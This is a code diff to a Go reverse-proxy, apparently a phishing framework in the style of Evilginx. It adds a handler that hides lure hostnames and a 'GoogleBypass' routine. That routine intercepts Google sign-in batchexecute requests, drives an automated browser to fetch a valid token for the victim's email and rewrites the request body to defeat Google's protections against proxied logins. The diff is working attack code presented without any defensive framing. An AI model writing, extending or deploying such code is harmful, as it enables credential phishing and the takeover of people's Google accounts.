@@ -679,6 +679,58 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return req, resp
 					}
 				}
+				if p.cfg.IsLureHostnameValid(req.Host) {
+					log.Debug("Lure hostname detected - returning 404 for request: %s", req.URL.String())
+					resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
+					if resp != nil {
+						return req, resp
+					}
+				}
+
+				if strings.EqualFold(req.Host, "accounts.google.com") &&
+					strings.Contains(req.URL.String(), "/signin/_/AccountsSignInUi/data/batchexecute?") &&
+					strings.Contains(req.URL.String(), "rpcids=V1UmUe") {
+
+					log.Debug("GoogleBypass working with: %v", req.RequestURI)
+
+					// Read original request body
+					body, err := ioutil.ReadAll(req.Body)
+					if err != nil {
+						log.Error("Failed to read request body: %v", err)
+						return req, nil
+					}
+					req.Body.Close()
+
+					// Decode URL-encoded body
+					decodedBody, err := url.QueryUnescape(string(body))
+					if err != nil {
+						log.Error("Failed to decode body: %v", err)
+						return req, nil
+					}
+					decodedBodyBytes := []byte(decodedBody)
+
+					b := &GoogleBypasser{
+						isHeadless:     false,
+						withDevTools:   false,
+						slowMotionTime: 1500,
+					}
+					b.Launch()
+					b.GetEmail(decodedBodyBytes)
+					b.GetToken()
+					decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)
+
+					// Re-encode body
+					postForm, err := url.ParseQuery(string(decodedBodyBytes))
+					if err != nil {
+						log.Error("Failed to parse form data: %v", err)
+						return req, nil
+					}
+					body = []byte(postForm.Encode())
+					req.ContentLength = int64(len(body))
+
+					// Reset request body
+					req.Body = io.NopCloser(bytes.NewBuffer(body))
+				}
 
 				// check if request should be intercepted
 				if pl != nil {
